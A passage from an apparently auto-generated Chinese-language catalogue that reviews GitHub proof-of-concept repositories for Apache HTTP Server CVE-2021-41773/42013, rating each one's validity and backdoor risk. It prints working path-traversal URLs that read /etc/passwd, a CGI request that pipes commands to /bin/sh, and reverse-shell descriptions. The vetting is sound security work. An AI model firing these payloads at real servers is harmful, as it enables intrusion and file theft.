    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
